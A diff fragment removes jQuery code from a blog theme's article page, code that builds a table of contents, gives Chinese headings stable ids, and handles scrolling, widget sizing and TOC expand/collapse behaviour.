-            headingsOffset: -($(window).height() * 0.4 - 45),
-            // headingsOffset: -205,
-            headingSelector: 'h1, h2, h3, h4, h5'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
-            $(this).attr('id', tocHeading + (++i));
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).slideUp(500);
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).slideDown(500);
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-    
 
 </main>
 
